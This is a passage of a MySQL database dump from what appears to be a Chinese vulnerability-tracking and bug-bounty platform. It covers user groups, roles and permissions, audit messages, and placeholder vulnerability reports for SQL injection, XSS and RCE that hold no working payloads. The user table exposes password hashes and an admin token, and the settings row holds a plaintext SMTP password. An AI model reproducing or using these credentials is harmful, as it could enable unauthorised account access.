  `name` varchar(255) NOT NULL,
  `desc` varchar(255) NOT NULL,
  `owner_id` int(11) NOT NULL,
  `parent` int(11) NOT NULL,
  `create_time` double NOT NULL,
  `update_time` double NOT NULL,
  PRIMARY KEY (`id`),
  KEY `group_owner_id` (`owner_id`),
  CONSTRAINT `group_ibfk_1` FOREIGN KEY (`owner_id`) REFERENCES `user` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `group`
--

LOCK TABLES `group` WRITE;
/*!40000 ALTER TABLE `group` DISABLE KEYS */;
INSERT INTO `group` VALUES (1,'5ec6379fff8390854aea563d','安全部','安全部 ...',1,0,1590048671.29034,1590048671.29034),(2,'620ca5cab1df1709463aa031','开发一部','',7,0,1644996042.8988876,1644996042.8988883),(3,'620ca5d2b1df1709463aa033','开发二部','',1,0,1644996050.4840477,1644996050.4840484),(4,'620ca5d9b1df1709463aa035','开发三部','',1,0,1644996057.3770616,1644996057.3770623),(5,'620ca5dfb1df1709463aa037','开发四部','',1,0,1644996063.5826428,1644996063.5826433),(7,'620cb607b1df1709463aa087','安恒','',1,0,1645000199.8966024,1645000199.896603),(8,'620dfa43b1df1709463aa0e1','国舜','',1,0,1645083203.6334696,1645083203.6334703);
/*!40000 ALTER TABLE `group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `groupuser`
--

DROP TABLE IF EXISTS `groupuser`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `groupuser` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  `role_id` int(11) NOT NULL,
  `create_time` double NOT NULL,
  PRIMARY KEY (`id`),
  KEY `groupuser_user_id` (`user_id`),
  KEY `groupuser_group_id` (`group_id`),
  KEY `groupuser_role_id` (`role_id`),
  CONSTRAINT `groupuser_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`),
  CONSTRAINT `groupuser_ibfk_2` FOREIGN KEY (`group_id`) REFERENCES `group` (`id`),
  CONSTRAINT `groupuser_ibfk_3` FOREIGN KEY (`role_id`) REFERENCES `role` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `groupuser`
--

LOCK TABLES `groupuser` WRITE;
/*!40000 ALTER TABLE `groupuser` DISABLE KEYS */;
INSERT INTO `groupuser` VALUES (1,'5ec6379fff8390854aea563e',1,1,3,1590048671.33214),(2,'620ca7d4b1df1709463aa03d',7,2,2,1644996564.7386255),(3,'620ca7f6b1df1709463aa03e',11,3,2,1644996598.2667766),(4,'620cb636b1df1709463aa088',10,7,4,1645000246.3525722),(5,'620dfa55b1df1709463aa0e2',9,8,4,1645083221.5801032),(6,'620dfbe4b1df1709463aa0fb',12,7,4,1645083620.8870745),(7,'620dfbf9b1df1709463aa0fc',13,8,4,1645083641.640809),(8,'620dfdb7b1df1709463aa0fe',14,2,2,1645084087.18994);
/*!40000 ALTER TABLE `groupuser` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `message`
--

DROP TABLE IF EXISTS `message`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `message` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `message_id` varchar(255) NOT NULL,
  `message_type` varchar(255) NOT NULL,
  `title` text NOT NULL,
  `content` text NOT NULL,
  `to_id` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  `create_time` double NOT NULL,
  PRIMARY KEY (`id`),
  KEY `message_to_id` (`to_id`),
  CONSTRAINT `message_ibfk_1` FOREIGN KEY (`to_id`) REFERENCES `user` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=97 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `message`
--

LOCK TABLES `message` WRITE;
/*!40000 ALTER TABLE `message` DISABLE KEYS */;
INSERT INTO `message` VALUES (22,'620cab0ab1df1709463aa043','620cab0ab1df1709463aa044','auditing','漏洞已确认','感谢提交',10,1,1644997386.491516),(23,'620cab0ab1df1709463aa045','620cab0ab1df1709463aa046','auditing','漏洞已确认','感谢提交',7,1,1644997386.4961085),(24,'620cabe3b1df1709463aa049','620cabe3b1df1709463aa04a','auditing','漏洞已知悉','',10,0,1644997603.326723),(25,'620cabe3b1df1709463aa04b','620cabe3b1df1709463aa04c','auditing','漏洞已知悉','',7,1,1644997603.3391507),(26,'620cac44b1df1709463aa04f','620cac44b1df1709463aa050','auditing','漏洞申请复测','麻烦再测试下',10,0,1644997700.4515753),(27,'620cac44b1df1709463aa051','620cac44b1df1709463aa052','auditing','漏洞申请复测','麻烦再测试下',7,1,1644997700.4561942),(28,'620cae4db1df1709463aa056','620cae4db1df1709463aa057','auditing','漏洞已确认','',10,0,1644998221.9322646),(29,'620cae4db1df1709463aa058','620cae4db1df1709463aa059','auditing','漏洞已确认','',7,1,1644998221.937098),(30,'620cae64b1df1709463aa05c','620cae64b1df1709463aa05d','auditing','漏洞已知悉','',10,0,1644998244.6763809),(31,'620cae64b1df1709463aa05e','620cae64b1df1709463aa05f','auditing','漏洞已知悉','',7,1,1644998244.6810791),(32,'620caf86b1df1709463aa062','620caf86b1df1709463aa063','auditing','漏洞申请复测','',10,0,1644998534.7278087),(33,'620caf86b1df1709463aa064','620caf86b1df1709463aa065','auditing','漏洞申请复测','',7,1,1644998534.73272),(34,'620cb11db1df1709463aa06e','620cb11db1df1709463aa06f','auditing','漏洞已确认','',10,0,1644998941.221722),(35,'620cb11db1df1709463aa070','620cb11db1df1709463aa071','auditing','漏洞已确认','',7,1,1644998941.226245),(36,'620cb189b1df1709463aa074','620cb189b1df1709463aa075','auditing','漏洞已知悉','',10,0,1644999049.5884197),(37,'620cb189b1df1709463aa076','620cb189b1df1709463aa077','auditing','漏洞已知悉','',7,1,1644999049.5930924),(38,'620cb1aeb1df1709463aa07a','620cb1aeb1df1709463aa07b','auditing','漏洞申请复测','',10,0,1644999086.6463878),(39,'620cb1aeb1df1709463aa07c','620cb1aeb1df1709463aa07d','auditing','漏洞申请复测','',7,1,1644999086.6511323),(40,'620cb229b1df1709463aa081','620cb229b1df1709463aa082','auditing','漏洞已修复','',10,0,1644999209.4004066),(41,'620cb229b1df1709463aa083','620cb229b1df1709463aa084','auditing','漏洞已修复','',7,1,1644999209.4051392),(42,'620cb6a2b1df1709463aa08c','620cb6a2b1df1709463aa08d','auditing','漏洞已确认','',10,0,1645000354.826722),(43,'620cb6a2b1df1709463aa08e','620cb6a2b1df1709463aa08f','auditing','漏洞已确认','',7,1,1645000354.8314373),(44,'620df3d7b1df1709463aa092','620df3d7b1df1709463aa093','auditing','漏洞已修复','yixiufu',10,0,1645081559.2412856),(45,'620df3d7b1df1709463aa094','620df3d7b1df1709463aa095','auditing','漏洞已修复','yixiufu',7,1,1645081559.2509933),(46,'620df54fb1df1709463aa098','620df54fb1df1709463aa099','auditing','漏洞已知悉','',10,0,1645081935.9627004),(47,'620df54fb1df1709463aa09a','620df54fb1df1709463aa09b','auditing','漏洞已知悉','',7,1,1645081935.9674587),(48,'620df55bb1df1709463aa09e','620df55bb1df1709463aa09f','auditing','漏洞申请复测','',10,0,1645081947.1245215),(49,'620df55bb1df1709463aa0a0','620df55bb1df1709463aa0a1','auditing','漏洞申请复测','',7,1,1645081947.129322),(50,'620df560b1df1709463aa0a4','620df560b1df1709463aa0a5','auditing','漏洞已修复','',10,0,1645081952.2115996),(51,'620df560b1df1709463aa0a6','620df560b1df1709463aa0a7','auditing','漏洞已修复','',7,1,1645081952.2162766),(52,'620df647b1df1709463aa0ab','620df647b1df1709463aa0ac','auditing','漏洞已确认','',10,0,1645082183.4692883),(53,'620df647b1df1709463aa0ad','620df647b1df1709463aa0ae','auditing','漏洞已确认','',7,1,1645082183.4740078),(54,'620df6bab1df1709463aa0b1','620df6bab1df1709463aa0b2','auditing','漏洞已知悉','',10,0,1645082298.1162817),(55,'620df6bab1df1709463aa0b3','620df6bab1df1709463aa0b4','auditing','漏洞已知悉','',7,1,1645082298.1212223),(56,'620df6ccb1df1709463aa0b7','620df6ccb1df1709463aa0b8','auditing','漏洞申请复测','',10,0,1645082316.559669),(57,'620df6ccb1df1709463aa0b9','620df6ccb1df1709463aa0ba','auditing','漏洞申请复测','',7,1,1645082316.5646052),(58,'620df703b1df1709463aa0bd','620df703b1df1709463aa0be','auditing','漏洞已修复','',10,0,1645082371.2457998),(59,'620df703b1df1709463aa0bf','620df703b1df1709463aa0c0','auditing','漏洞已修复','',7,1,1645082371.2508864),(60,'620df706b1df1709463aa0c3','620df706b1df1709463aa0c4','auditing','漏洞已修复','',10,0,1645082374.8724413),(61,'620df706b1df1709463aa0c5','620df706b1df1709463aa0c6','auditing','漏洞已修复','',7,1,1645082374.8772295),(62,'620df76bb1df1709463aa0ca','620df76bb1df1709463aa0cb','auditing','漏洞已确认','',10,0,1645082475.6982603),(63,'620df76bb1df1709463aa0cc','620df76bb1df1709463aa0cd','auditing','漏洞已确认','',7,1,1645082475.7080579),(64,'620df77fb1df1709463aa0d0','620df77fb1df1709463aa0d1','auditing','漏洞已知悉','',10,0,1645082495.0453541),(65,'620df77fb1df1709463aa0d2','620df77fb1df1709463aa0d3','auditing','漏洞已知悉','',7,1,1645082495.0502858),(66,'620df78ab1df1709463aa0d6','620df78ab1df1709463aa0d7','auditing','漏洞申请复测','',10,0,1645082506.2652092),(67,'620df78ab1df1709463aa0d8','620df78ab1df1709463aa0d9','auditing','漏洞申请复测','',7,1,1645082506.2701087),(68,'620df7a3b1df1709463aa0dc','620df7a3b1df1709463aa0dd','auditing','漏洞已修复','',10,0,1645082531.7523332),(69,'620df7a3b1df1709463aa0de','620df7a3b1df1709463aa0df','auditing','漏洞已修复','',7,1,1645082531.7570179),(70,'620dfb18b1df1709463aa0e9','620dfb18b1df1709463aa0ea','auditing','漏洞已确认','',9,0,1645083416.3607235),(71,'620dfb18b1df1709463aa0eb','620dfb18b1df1709463aa0ec','auditing','漏洞已确认','',7,1,1645083416.3656037),(72,'620dfb1fb1df1709463aa0ef','620dfb1fb1df1709463aa0f0','auditing','漏洞已确认','',10,0,1645083423.9734704),(73,'620dfb1fb1df1709463aa0f1','620dfb1fb1df1709463aa0f2','auditing','漏洞已确认','',7,1,1645083423.978234),(74,'620dfb2ab1df1709463aa0f5','620dfb2ab1df1709463aa0f6','auditing','漏洞已驳回','',10,0,1645083434.4114282),(75,'620dfb2ab1df1709463aa0f7','620dfb2ab1df1709463aa0f8','auditing','漏洞已驳回','',7,1,1645083434.4162312),(76,'620e013db1df1709463aa103','620e013db1df1709463aa104','auditing','漏洞已确认','',10,0,1645084989.431346),(77,'620e013db1df1709463aa105','620e013db1df1709463aa106','auditing','漏洞已确认','',14,0,1645084989.4364784),(78,'620e013db1df1709463aa107','620e013db1df1709463aa108','auditing','漏洞已确认','',7,1,1645084989.4460483),(79,'620e0147b1df1709463aa10b','620e0147b1df1709463aa10c','auditing','漏洞已知悉','',10,0,1645084999.139724),(80,'620e0147b1df1709463aa10d','620e0147b1df1709463aa10e','auditing','漏洞已知悉','',14,0,1645084999.144203),(81,'620e0147b1df1709463aa10f','620e0147b1df1709463aa110','auditing','漏洞已知悉','',7,1,1645084999.1488116),(83,'620e0c5ab1df1709463aa119','620e0c5ab1df1709463aa11a','auditing','漏洞已确认','',11,0,1645087834.5072966),(84,'620e0db0b1df1709463aa11e','620e0db0b1df1709463aa11f','auditing','漏洞已知悉','',9,0,1645088176.3414822),(85,'620e0db0b1df1709463aa120','620e0db0b1df1709463aa121','auditing','漏洞已知悉','',14,0,1645088176.3470206),(86,'620e0db0b1df1709463aa122','620e0db0b1df1709463aa123','auditing','漏洞已知悉','',7,1,1645088176.351365),(88,'620e0f24b1df1709463aa12e','620e0f24b1df1709463aa12f','auditing','漏洞已知悉','',11,0,1645088548.322116),(90,'620e0f2bb1df1709463aa134','620e0f2bb1df1709463aa135','auditing','漏洞申请复测','',11,0,1645088555.5164318),(91,'620f5113b1df1709463aa146','620f5113b1df1709463aa147','auditing','漏洞申请复测','',10,0,1645170963.2969244),(92,'620f5113b1df1709463aa148','620f5113b1df1709463aa149','auditing','漏洞申请复测','',14,0,1645170963.3015573),(93,'620f5113b1df1709463aa14a','620f5113b1df1709463aa14b','auditing','漏洞申请复测','',7,0,1645170963.3060148),(94,'62134175887ab8b7c2881a0a','62134175887ab8b7c2881a0b','auditing','漏洞已知悉','',10,0,1645429109.9735906),(95,'62134175887ab8b7c2881a0c','62134175887ab8b7c2881a0d','auditing','漏洞已知悉','',14,0,1645429109.9786434),(96,'62134175887ab8b7c2881a0e','62134175887ab8b7c2881a0f','auditing','漏洞已知悉','',7,0,1645429109.9832177);
/*!40000 ALTER TABLE `message` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `messagepoint`
--

DROP TABLE IF EXISTS `messagepoint`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `messagepoint` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `message_id` varchar(255) NOT NULL,
  `from_uid` int(11) NOT NULL,
  `to_uid` int(11) NOT NULL,
  `title` text NOT NULL,
  `content` text NOT NULL,
  `total_points` varchar(255) NOT NULL,
  `frozen_points` varchar(255) NOT NULL,
  `available_points` varchar(255) NOT NULL,
  `create_time` double NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `messagepoint`
--

LOCK TABLES `messagepoint` WRITE;
/*!40000 ALTER TABLE `messagepoint` DISABLE KEYS */;
/*!40000 ALTER TABLE `messagepoint` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `role`
--

DROP TABLE IF EXISTS `role`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `role` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `level` int(11) NOT NULL,
  `accesses` text,
  `desc` varchar(255) NOT NULL,
  `type` int(11) NOT NULL,
  `default` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `role`
--

LOCK TABLES `role` WRITE;
/*!40000 ALTER TABLE `role` DISABLE KEYS */;
INSERT INTO `role` VALUES (1,'5ec6379fff8390854aea5639','超级管理员',0,'action.app.AppAdd,action.app.AppDel,action.app.AppGet,action.app.AppList,action.app.AppExConfig,action.article.ArticleUpsert,action.article.ArticleDel,action.category.CategoryUpsert,action.category.CategoryDel,action.assets.AssetAdd,action.assets.AssetDel,action.assets.AssetGet,action.assets.AssetList,action.assets.AssetAll,action.assets.AssetImport,action.auditing.AuditingIgnore,action.auditing.AuditingReject,action.auditing.AuditingUndo,action.auditing.AuditingConfirm,action.auditing.AuditingFixed,action.authmode.AuthModeUpsert,action.authmode.AuthModeDel,action.authmode.AuthModeList,action.authmode.AuthModeAll,action.authmode.AuthModeTest,action.crontab.CronTabAdd,action.crontab.CronTabDel,action.crontab.CronTabEnable,action.crontab.CronTabReset,action.crontab.CronTabGet,action.crontab.CronTabList,action.crontab.CronTabnRun,action.crontab.CrontabCalendar,action.crontab.CronTabLogList,action.docs.LogList,action.docs.InitDB,action.docs.ExampleData,action.system.SystemConfigGet,action.system.SystemConfig,action.system.SystemMailConfig,action.system.SystemVulConfig,action.extension.ExtensionUpload,action.extension.ExtensionDel,action.extension.ExtensionEnable,action.extension.ExtensionList,action.extension.ExtensionDownload,action.extension.ExtensionConfig,action.extension.ExtensionLogAdd,action.extension.ExtensionLogList,action.extension.ExtensionCrontabCalendar,action.group.GroupUpsert,action.group.GroupDel,action.group.GroupOwnerSet,action.group.GroupList,action.group.GroupChildList,action.groupuser.GroupUserUpsert,action.groupuser.GroupUserDel,action.groupuser.GroupUserList,action.point.PointFrozen,action.point.PointUnFrozen,action.point.PointReward,action.point.PointList,action.point.PointLog,action.role.RoleAdd,action.role.RoleDefault,action.role.RoleDel,action.role.RoleList,action.user.UserAdd,action.user.UserDel,action.user.UserList,action.user.LdapSearch,action.user.UserClear,action.vul.VulDelay,action.vul.VulSendNotificationEmail,action.vul.VulList,action.vul.VulExport,action.vul.VulImport,action.vullog.VulLogDel,action.vullog.VulLogList','',0,0),(2,'5ec6379fff8390854aea563a','应用负责人',5,'action.vul.VulDelay,action.vul.VulSendNotificationEmail,action.vul.VulList,action.vul.VulExport,action.vul.VulImport,action.vullog.VulLogDel,action.vullog.VulLogList','',0,0),(3,'5ec6379fff8390854aea563b','安全人员',3,'action.app.AppAdd,action.app.AppDel,action.app.AppGet,action.app.AppList,action.app.AppExConfig,action.article.ArticleUpsert,action.article.ArticleDel,action.category.CategoryUpsert,action.category.CategoryDel,action.assets.AssetAdd,action.assets.AssetDel,action.assets.AssetGet,action.assets.AssetList,action.assets.AssetAll,action.assets.AssetImport,action.auditing.AuditingIgnore,action.auditing.AuditingReject,action.auditing.AuditingUndo,action.auditing.AuditingConfirm,action.auditing.AuditingFixed,action.docs.LogList,action.point.PointFrozen,action.point.PointUnFrozen,action.point.PointReward,action.point.PointList,action.point.PointLog,action.user.UserAdd,action.vul.VulDelay,action.vul.VulSendNotificationEmail,action.vul.VulList,action.vul.VulExport,action.vul.VulImport','',1,0),(4,'620cb5e9b1df1709463aa085','渗透人员',7,'action.vul.VulList,action.vul.VulExport,action.vul.VulImport','',0,1);
/*!40000 ALTER TABLE `role` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `systemsettings`
--

DROP TABLE IF EXISTS `systemsettings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `systemsettings` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `smtp_host` varchar(255) DEFAULT NULL,
  `smtp_port` varchar(255) DEFAULT NULL,
  `smtp_user` varchar(255) DEFAULT NULL,
  `smtp_pass` varchar(255) DEFAULT NULL,
  `smtp_head` varchar(255) DEFAULT NULL,
  `smtp_sign` varchar(255) DEFAULT NULL,
  `smtp_auth_type` varchar(255) DEFAULT NULL,
  `mail_list` varchar(255) DEFAULT NULL,
  `vul_setting` varchar(255) DEFAULT NULL,
  `global_setting` varchar(255) DEFAULT NULL,
  `point_setting` varchar(255) DEFAULT NULL,
  `site_status` varchar(255) DEFAULT NULL,
  `version` varchar(255) DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `systemsettings`
--

LOCK TABLES `systemsettings` WRITE;
/*!40000 ALTER TABLE `systemsettings` DISABLE KEYS */;
INSERT INTO `systemsettings` VALUES (1,'5ec6379fff8390854aea563f','','25','','88888888','','',NULL,'','10,20,50,55,60','{\"group_member_limit\": \"10\", \"isCreateGroup\": \"1\", \"isSendEmail\": \"0\", \"isWaterMarkOn\": \"1\"}','{\"one_level_point\": 1, \"three_level_point\": 1, \"times_level_point\": 1, \"other_level_point\": 1, \"two_level_point\": 1, \"ti_level_point\": 1}',NULL,'v1.0.0');
/*!40000 ALTER TABLE `systemsettings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `test`
--

DROP TABLE IF EXISTS `test`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `test` (
  `_id` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  PRIMARY KEY (`_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `test`
--

LOCK TABLES `test` WRITE;
/*!40000 ALTER TABLE `test` DISABLE KEYS */;
/*!40000 ALTER TABLE `test` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user`
--

DROP TABLE IF EXISTS `user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `username` varchar(255) NOT NULL,
  `nickname` varchar(255) NOT NULL,
  `avatar` varchar(255) NOT NULL,
  `token` varchar(255) NOT NULL,
  `token_enable` int(11) NOT NULL,
  `is_del` int(11) NOT NULL,
  `email` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `enable` int(11) NOT NULL,
  `ldap_online` int(11) NOT NULL,
  `ldap_offline_time` double NOT NULL,
  `auth_from` varchar(255) NOT NULL,
  `role_id` int(11) NOT NULL,
  `create_time` double NOT NULL,
  `update_time` double NOT NULL,
  `active_time` double NOT NULL,
  `login_time` double NOT NULL,
  `total_points` int(11) NOT NULL,
  `frozen_points` int(11) NOT NULL,
  `available_points` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user_username` (`username`),
  KEY `user_role_id` (`role_id`),
  CONSTRAINT `user_ibfk_1` FOREIGN KEY (`role_id`) REFERENCES `role` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user`
--

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` VALUES (1,'5ec6379fff8390854aea563c','admin','','','ee983534f72f8c58b0e941841676b797',1,0,'','964e5ddd6937790486f669e56af2bdc8',1,0,0,'LOCAL',1,1590048671.24865,1644911836.0970938,1645427655.9592738,1645427386.3733537,0,0,0),(7,'620c9f04b1df1709463aa016','develop1','','','',1,0,'develop1@develop1.com','964e5ddd6937790486f669e56af2bdc8',1,0,0,'LOCAL',2,1644994308.4526243,1645426067.4786665,1645170996.3588862,1645170781.4690068,0,0,0),(8,'620c9fd0b1df1709463aa017','sec01','','','',1,0,'sec01@sec01.com','f781f108443fe573beb8eb9196070cc4',1,0,0,'LOCAL',3,1644994512.2722728,1645426086.4376903,1645411579.0071578,1645407950.2060895,0,0,0),(9,'620ca675b1df1709463aa038','guoshun','','','',1,0,'guoshun@guoshun.com','cb416156e0e5b97f21bd9fefa1add4f1',1,0,0,'LOCAL',2,1644996213.422552,1644996213.4225569,1645088180.7955513,1645087993.200452,1,0,1),(10,'620ca683b1df1709463aa039','anheng','','','',1,0,'anheng@anheng.com','34b825d773fcf294d7432389e910eaf4',1,0,0,'LOCAL',4,1644996227.6352365,1645000221.989189,1645429110.3169484,1645427679.3705122,22,0,22),(11,'620ca69cb1df1709463aa03a','develop2','','','',1,0,'develop2@develop2.com','94f44ac954e0a1e79b255fbc327f409c',1,0,0,'LOCAL',2,1644996252.897125,1644996252.8971264,1645087773.7635818,1645085187.8826232,1,0,1),(12,'620dfbc1b1df1709463aa0f9','anheng2','','','',1,0,'anheng2@anheng2.com','14e306d7b37ade8c2e8cf6700c748ed1',1,0,0,'LOCAL',4,1645083585.936114,1645083585.93612,1645083758.8975732,1645083661.3188877,0,0,0),(13,'620dfbd5b1df1709463aa0fa','guoshun2','','','',1,0,'guoshun2@guoshun2.com','fafe329bb2aa0b47e87a15416387c01e',1,0,0,'LOCAL',4,1645083605.1417637,1645083605.1417649,1645083605.1417654,0,0,0,0),(14,'620dfda7b1df1709463aa0fd','develop11','','','',1,0,'develop11@a.com','7fbdbfa9f852082a8b4fd439ac7b284c',1,0,0,'LOCAL',2,1645084071.1098905,1645084071.1098917,1645085019.8995245,1645085019.105971,0,0,0);
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `vul`
--

DROP TABLE IF EXISTS `vul`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `vul` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `vul_name` varchar(255) DEFAULT NULL,
  `vul_type` int(11) NOT NULL,
  `vul_level` int(11) NOT NULL,
  `self_rank` varchar(255) DEFAULT NULL,
  `vul_desc_type` int(11) NOT NULL,
  `vul_poc` longtext,
  `vul_poc_html` longtext,
  `vul_solution` longtext,
  `vul_solution_html` longtext,
  `article_id` varchar(255) DEFAULT NULL,
  `audit_user_id` int(11) NOT NULL,
  `reply` text,
  `user_id` int(11) NOT NULL,
  `submit_time` double NOT NULL,
  `audit_time` double NOT NULL,
  `notice_time` double NOT NULL,
  `update_time` double NOT NULL,
  `fix_time` double NOT NULL,
  `vul_status` int(11) NOT NULL,
  `asset_level` int(11) NOT NULL,
  `real_rank` int(11) NOT NULL,
  `score` int(11) NOT NULL,
  `risk_score` int(11) NOT NULL,
  `left_risk_score` int(11) NOT NULL,
  `app_id` int(11) NOT NULL,
  `vul_source` int(11) NOT NULL,
  `send_msg` int(11) NOT NULL,
  `is_retest` int(11) NOT NULL,
  `layer` int(11) NOT NULL,
  `delay_days` int(11) NOT NULL,
  `delay_reason` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `vul`
--

LOCK TABLES `vul` WRITE;
/*!40000 ALTER TABLE `vul` DISABLE KEYS */;
INSERT INTO `vul` VALUES (8,'620caa7fb1df1709463aa040','sql注入1',10,0,'10',0,'xxx\nxxx\nxx','<p>xxx<br />\nxxx<br />\nxx</p>','','','',0,NULL,10,1644997247.8523777,1644997386.2835207,1644997603.1535614,1644997247.852143,1645082374.6731496,60,0,10,0,0,0,5,10,0,0,10,0,NULL),(9,'620cae31b1df1709463aa053','xss1',15,0,'3',0,'','','','','',0,NULL,10,1644998193.9462903,1644998221.7332103,1644998244.5041938,1644998193.9460666,1645081559.0627823,60,0,3,0,0,0,5,10,0,0,10,0,NULL),(10,'620cb101b1df1709463aa06b','sql2',10,0,'1',0,'','','','','',0,NULL,10,1644998913.1131108,1644998941.0223315,1644999049.413306,1644998913.112849,1644999209.2235496,60,0,1,0,0,0,5,10,0,0,10,0,NULL),(11,'620cb662b1df1709463aa089','xss2',15,0,'1',0,'','','','','',0,NULL,10,1645000290.3773277,1645000354.6222599,1645081935.7866724,1645000290.3771236,1645081952.038201,60,0,1,0,0,0,5,10,0,0,10,0,NULL),(12,'620df612b1df1709463aa0a8','rce1',25,0,'3',0,'','','','','',0,NULL,10,1645082130.1267285,1645082183.26658,1645082297.921599,1645082130.1264975,1645082371.0684385,60,0,3,0,0,0,5,10,0,0,10,0,NULL),(13,'620df744b1df1709463aa0c7','rce2',20,0,'2',0,'','','','','',0,NULL,10,1645082436.7573483,1645082475.4947274,1645082494.8670607,1645082436.7571359,1645082531.5745218,60,0,2,0,0,0,5,10,0,0,10,0,NULL),(14,'620dfa96b1df1709463aa0e3','sql_gs',10,0,'2',0,'','','','','',0,NULL,10,1645083286.711087,0,0,1645083286.710803,1645083434.2274182,30,0,0,0,0,0,5,20,0,0,10,0,NULL),(15,'620dfac5b1df1709463aa0e5','rce_ah',25,0,'1',0,'','','','','',0,NULL,10,1645083333.1715596,1645083423.7661989,1645429109.8731892,1645083333.1713426,0,50,0,1,0,0,0,5,10,0,0,10,0,NULL),(16,'620dfaf4b1df1709463aa0e6','rce_gs',25,0,'1',0,'','','','','',0,NULL,9,1645083380.7699246,1645083416.1271276,1645088176.1467073,1645083380.7696545,0,50,0,1,0,0,0,5,20,0,0,10,0,NULL),(17,'620e0114b1df1709463aa100','sql_kaifa2',10,0,'1',0,'','','','','',0,NULL,10,1645084948.4856853,1645084989.2050765,1645084998.9424217,1645084948.4854581,0,55,0,1,0,0,0,6,10,0,0,10,0,NULL),(18,'620e0c1ab1df1709463aa113','aaa',10,0,'1',0,'aaaa\n![gggggg.jpeg](static/images/5a8ef9925dd6afbe190c4d3c7e7e5531.jpeg)','<p>aaaa<br />\n<img src=\"static/images/5a8ef9925dd6afbe190c4d3c7e7e5531.jpeg\" alt=\"gggggg.jpeg\" /></p>','','','',0,NULL,11,1645087770.9586818,1645087834.303072,1645088548.1412747,1645087770.958414,0,55,0,1,0,0,0,7,10,0,0,10,0,NULL),(19,'6212eeb1b1df1709463aa155','sql_4',10,0,'9',0,'','','','','',0,NULL,8,1645407921.0393386,0,0,1645407977.3496256,0,10,0,0,0,0,0,7,10,0,0,10,0,NULL),(20,'6213327a887ab8b7c2881a06','1',45,0,'7',0,'','','','','5de76148152e93ac81d80012',0,NULL,1,1645425274.855776,0,0,1645425274.8556187,0,10,0,0,0,0,0,8,30,0,0,10,0,NULL);
/*!40000 ALTER TABLE `vul` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `vullog`
--

DROP TABLE IF EXISTS `vullog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `vullog` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `vul_id` int(11) NOT NULL,
  `title` text NOT NULL,
  `user_id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
